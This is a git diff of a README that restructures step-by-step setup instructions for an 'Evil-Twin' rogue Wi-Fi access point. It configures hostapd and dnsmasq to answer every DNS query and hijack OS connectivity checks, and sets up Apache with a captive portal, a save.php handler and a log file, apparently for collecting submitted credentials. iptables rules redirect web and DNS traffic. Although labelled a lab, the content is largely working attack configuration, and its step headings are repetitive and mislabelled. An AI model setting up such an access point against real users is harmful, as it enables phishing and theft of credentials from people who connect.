@@ -1,13 +1,22 @@
 # Evil-Twin
 Set up your LAB
-install:
+
+### 1) Installation all pachages:
 ```bash
 sudo apt update
+sudo apt install -y apache2 php libapache2-mod-php
 sudo apt install -y hostapd dnsmasq lighttpd php
-``  
-
 ```
-dnsmasq.conf file:
+
+### 2) Setting up wlan0 Interface:
+```bash
+sudo ip link set wlan0 down
+sudo ip addr flush dev wlan0
+sudo ip addr add 192.168.50.1/24 dev wlan0
+sudo ip link set wlan0 up
+```
+
+### 3) configure dnsmasq.conf file:
 ```bash
 interface=wlan0
 bind-interfaces
@@ -23,74 +32,54 @@ address=/#/192.168.50.1
 address=/captive.apple.com/192.168.50.1
 address=/www.msftconnecttest.com/192.168.50.1
 address=/connectivitycheck.gstatic.com/192.168.50.1
-
 ```
 
-hostapd.conf:
+### 4) configure hostapd.conf file:
 ```bash
 interface=wlan0
 driver=nl80211
-ssid=LabPortal
+ssid=TestNetworkName 
 hw_mode=g
 channel=6
 auth_algs=1
 wmm_enabled=0
 ```
 
-
-
-wlan0 interface:
+### 5) configure a2enmod:
 ```bash
-sudo ip link set wlan0 down
-sudo ip addr flush dev wlan0
-sudo ip addr add 192.168.50.1/24 dev wlan0
-sudo ip link set wlan0 up
-
-```
-
-PHP + Apache:
-```bash
-sudo apt update
-sudo apt install -y apache2 php libapache2-mod-php
-sudo systemctl enable --now apache2
-```
-
-start:
-```bash
-sudo hostapd hostapd.conf
-sudo dnsmasq -C dnsmasq.conf
-```
-
-New Models:
-```bash
+sudo systemctl start apache2
 sudo a2enmod rewrite
 sudo a2enmod headers
 sudo systemctl restart apache2
 ```
 
-Create Folder:
+### 5) Create captive Foles:
 ```bash
 sudo mkdir -p /var/www/captive
 ```
-Create File:
+
+### 6) Create Web Captive Portal:
 ```bash
 /var/www/captive/index.html
 /var/www/captive/save.php
 ```
-Create Log file:
+
+### 7) Create log file:
 ```bash
 touch /var/log/ca.log
 ```
-Permission to log file:
+
+### 8) Permission for file:
 ```bash
 sudo chown www-data:www-data /var/log/ca.log
 sudo chmod 640 /var/log/ca.log
 ```
 
-New Vhost:
+### 9) Create Vhost:
 ```bash
 nano /etc/apache2/sites-available/captive.conf
 ```
+
 ```bash
 <VirtualHost *:80>
     ServerName captive.portal
@@ -121,6 +110,8 @@ nano /etc/apache2/sites-available/captive.conf
     Header always set Expires "0"
 </VirtualHost>
 ```
+
+### 10) Create Vhost:
 ```bash
 sudo a2ensite captive.conf
 sudo a2dissite 000-default.conf
@@ -128,11 +119,17 @@ sudo systemctl reload apache2
 ```
 
 
+### 11) Create Vhost:
 IpTables:
 ```bash
 sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-ports 80
 sudo iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j REDIRECT --to-ports 53
 sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j REDIRECT --to-ports 53
+```
 
-
+### 12) Create Vhost:
+start:
+```bash
+sudo hostapd hostapd.conf
+sudo dnsmasq -C dnsmasq.conf
 ```
